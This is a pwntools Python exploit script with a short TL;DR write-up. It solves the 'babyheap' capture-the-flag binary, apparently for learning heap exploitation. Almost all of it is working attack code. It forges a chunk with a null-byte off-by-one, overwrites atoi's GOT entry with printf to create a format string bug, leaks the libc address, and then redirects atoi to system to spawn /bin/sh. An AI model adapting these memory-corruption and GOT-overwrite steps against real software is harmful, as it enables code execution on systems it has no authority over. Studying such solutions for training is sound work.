#!/usr/bin/env python
from pwn import *
from os import getcwd, path

context.arch = 'amd64'
context.terminal = ['tmux', 'sp', '-h']

elf  = ELF('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def new(size, content, name):
	io.sendlineafter('Your choice:', '1')
	io.sendlineafter('Size :', str(size))
	io.sendafter('Content:', content)
	io.sendafter('Name:', name)	

def delete():
	io.sendlineafter('Your choice:', '2')

def edit(content):
	io.sendlineafter('Your choice:', '3')
	io.sendafter('Content:', content)

def exit(confirmation):
	io.sendlineafter('Your choice:', '4')
	io.sendafter('Really? (Y/n)', confirmation)

io = process(elf.path, env = {'LD_PRELOAD' : path.join(getcwd(), './libdealarm.so')})

exit('n' + '\x00' * 0xfe7 + p64(0x50))

new(0x80, 'A' * 8 + p64(0x18), 'B' * 8) # null byte off-by-one

delete()

"""
struct Node {
	size_t size;
  	char name[8];
 	char* content;
};
"""

node = flat(
	0x8,
	'A' * 8,
	elf.got['atoi']
)

# 			chunk size +  fake node
new(0x48, p64(0x0) * 3 + p64(0x21) + node, 'B' * 7)

edit(p64(elf.plt['printf'] + 6))

io.sendlineafter('Your choice:', '%3$p')

libc.address = int(io.recvline(), 16) - 0x11759c
log.success('Libc @ {:#x}'.format(libc.address))

io.sendlineafter('Your choice:', '%9$nAAAA' + p64(0x6020a4) + 'AA')

io.sendlineafter('Content:', p64(libc.sym['system']))

io.sendlineafter('Your choice:', '/bin/sh')

io.interactive()

"""
TL;DR
Use scanf (ubuntu 16.04) for writting fake chunk prev_size (0x50).
Then abuse off-by-one null byte (.text:00000000004009C5    mov byte ptr [rax], 0), and overwrite
content's ptr LSB (to make it point to our fake chunk).
Delete our fake chunk and create a new one 0x50 less metadata size then place our fake node (content now points to atoi@got).
Overwrite atoi@got to printf@plt+6 for getting a format string vulnerability.
Leak libc using the format string and restore the context.
Overwrite atoi@got with system@libc and get shell.
"""